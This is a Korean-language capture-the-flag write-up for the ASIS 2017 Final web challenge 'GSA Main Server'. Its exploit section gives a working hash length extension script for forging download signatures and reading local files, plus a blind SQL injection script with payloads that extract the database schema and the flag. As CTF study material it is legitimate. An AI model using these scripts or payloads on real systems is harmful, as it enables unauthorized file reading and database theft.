# [WEB] ASIS 2017 FINAL - GSA Main Server

# Description
global security agency main server, it interacts with several GSA's servers. Try to find some holes, and you will be rewarded a flag.

> Host: gsa.mainServer.domain
> Scope: 178.62.34.76:\*
> Hint: Forget the XSS

# Analysis
페이지에 접근하면 단순 뷰페이지로 구성되어 있는거 같다.
http://178.62.34.76/index.php~ 를 요청하면 소스를 볼 수 있다.
소스 중에서 흥미로운 부분은 functions.php이다.
```php
# index.php~
<? require 'functions.php' ?>
```
http://178.62.34.76/functions.php~ 를 들어가면 다시 소스가 보여진다.
(문제 풀때는 아무생각 없이 ~를 넣었는데 자세히 보니 index.php아래에 vim을 사용한 주석같은게 있었던거 같다.)
```php
<?php

// database configuration
include 'configuration.php';

// waf to protect the web attacks
include 'waf.php';

// connection to the database
$mysqli = new mysqli(__DB_HOST, __DB_USER, __DB_PASS, __DB_NAME);

// signature function
// store __KEY in safe place
// __KEY is stored in configuration.php
// do not change the __KEY if you don't know how the system workes, the installation process produces secure 10-chacacter key
function makeSignature($fileName){
    return md5(md5(__KEY) . $fileName);
}

// function to get header data by HTTP packet
function getHeaderData($headers, $name){
    return (array_key_exists($name, $headers))?$headers[$name]:false;
}

// parsing the database resultst
function resultToArray($result){
    $rows = array();
    while($row = $result->fetch_assoc()){
        $rows[] = $row;
    }
    return $rows;
}
```
여기서 흥미로는 함수는 makeSignature이다.
KEY를 md5로 해쉬화 한 후 fineName과 합친 후 다시 md5로 해쉬화 하는데, KEY를 알아낼 수가 없다!

소스 분석은 이정도로하고 아무 게시물이나 들어가서 다운로드를 요청하면 Response헤더에 `X-Signature: beb2e68c628653c72abcb388b078cfda`와 함께, 파일 `file.txt`을 요청한다.
여기서 보이는 X-Signature값이 위의 makeSignature 함수를 통해 만들어진 값이다.
이를 잘 이용하면 될 것 같다.(하하)

# Exploit
1. Hash Length Extension Vulnerability
2. SQLi

## 1. Hash Length Extension Vulnerability
우선 X-Signature를 맞춰줘야 원하는 파일을 다운받을 수 있다.
md5고 해서 엄청 고민하다가 그냥 문뜩 생각났다. Hash Length Extension 공격이..
(대회 끝나고 간만에 다시보니, sha1과 md5 둘다 padding attack(Hash Length extension)에 취약하며, key를 몰라도 hash(key)와 len(key)가 주어지면 hash(key||key')를 구할 수 있다.)
> 참고 : https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks

파이썬 스크립트를 작성하여 해쉬를 만들어 원하는 파일을 요청하게 만들었다.
```python
import hashpumpy
import urllib2
import urllib

url = "http://178.62.34.76/getAttachment/"

origin_sig = "beb2e68c628653c72abcb388b078cfda"
origin_data = "file.txt"
key_length = 32

while 1:
	append_data = '?/'+raw_input("path : ")
	new_signature,new_data  = hashpumpy.hashpump(origin_sig,origin_data,append_data,key_length)
	print 'new signature : %s'%(new_signature)
	print 'new data : %s'%(new_data).encode('hex')
	req = urllib2.Request(url+urllib.quote_plus(urllib.quote_plus(new_data)))
	req.add_header('X-Signature',new_signature)
	res = urllib2.urlopen(req)
	print res.read()
```

이를 이용해 LFI를 했는데, .htaccess파일에서 힌트를 얻을 수 있었다.
```
path : ../../.htaccess
new signature : 77a6762d005d965a0ee69202bd67ca28
new data : 66696c652e7478748000000000000000000000000000000040010000000000003f2f2e2e2f2e2e2f2e6874616363657373
RewriteEngine on

RewriteRule simple-php-captcha.php simple-php-captcha.php [L]

RewriteRule showInformation/(.+) /showInformation.php?informationID=$1 [L]
RewriteRule infoSubmit /informationSubmit.php [L]
RewriteRule notConfirmedInformation/(.+) /notConfirmedInformation.php?informationID=$1 [L]
RewriteRule getAttachment/(.+) /getAttachment.php?fileName=$1 [L]
RewriteRule dataSubmitted/(.+) /dataSubmitted.php [L]
RewriteRule adminer-4.3.1-en.php adminer-4.3.1-en.php [L]

#RewriteRule "searchData/(.+)" "http://gsa.dataStorage.domain/0/portalSearch/?searchURL=$1" [L]
#RewriteRule "API/(.+)" "http://gsa.API.domain/api/$1" [L]

RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_FILENAME} !-f
RewriteRule . index.php [L]

RewriteCond %{THE_REQUEST} \.php[\ /?].*HTTP/ [NC]
RewriteRule ^.*$ index.php [L]
```
오 showInformation 또는 notConfirmedInformation에서 인젝션이 나올 거 같이 생겼다.

## 2. SQLi
위에서 발견한 위치 중 notConfirmedInformation에서 SQLi가 발생하였다.
참일 경우 Visited의 값이 오르고, 거짓이면 Visited의 값이 오르지 않는다.(Blind SQLi!!!)
데이터를 뽑아보자!

```python
import urllib2
import urllib
from multiprocessing import Pool
import itertools
import sys

ue = lambda x:urllib.quote(x)
url = "http://178.62.34.76/notConfirmedInformation/"
query = lambda i,j: "115557071-if(substr(lpad(bin(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))),7,0),%d,1)=1,0,115557071)" % (i, (8-j))
query = lambda i,j: "115557071-if(substr(lpad(bin(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='gsaportal')),%d,1))),7,0),%d,1)=1,0,115557071)" % (i, (8-j))
query = lambda i,j: "115557071-if(substr(lpad(bin(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),%d,1))),7,0),%d,1)=1,0,115557071)" % (i, (8-j))
query = lambda i,j: "115557071-if(substr(lpad(bin(ascii(substr((select(flag)from(flag)),%d,1))),7,0),%d,1)=1,0,115557071)" % (i, (8-j))

if __name__ == '__main__':
    result = bytearray()
    prev_visited = 419
    for i in range(1,80):
        tmp = 0
        for j in range(1,8):
            req = urllib2.Request(url+ query(i,j))
            res = urllib2.urlopen(req)
            visited = int(res.read().split('Visited:</b> ')[1].split('</div>')[0])
            if visited == prev_visited+1:
                prev_visited = visited
                tmp = tmp + (1<<(j-1))
        if tmp==0:
            break
        result.append(chr(tmp))
        sys.stdout.write(chr(tmp))
        sys.stdout.flush()
```

뽑혔다.
flag테이블의 flag컬럼에서 flag를 얻을 수 있다.(flag....)

**ASIS{SQLi_sT1lL_Ex1sT5_G0od_j0B}**
